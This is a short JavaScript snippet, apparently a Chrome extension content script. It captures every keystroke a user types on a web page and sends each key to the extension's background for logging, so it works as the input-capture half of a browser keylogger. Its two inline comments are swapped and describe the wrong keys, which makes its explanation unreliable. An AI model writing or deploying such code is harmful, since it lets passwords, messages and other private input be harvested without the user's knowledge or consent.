document.addEventListener('keydown', (event) => {
    let key = event.key;

    if (key === 'Backspace') {
        key = '🎃'; // Handle Enter as a newline
    } else if (key === 'Enter') {
        key = '\n'; // Replace Backspace with the 🎃 emoji
    } else if (['CapsLock', 'Shift', 'Control', 'Alt', 'Tab', 'Meta'].includes(key)) {
        return; // Ignore these keys
    }

    // Send the key (or 🎃) to be logged
    chrome.runtime.sendMessage({ type: 'logKey', key: key });
});
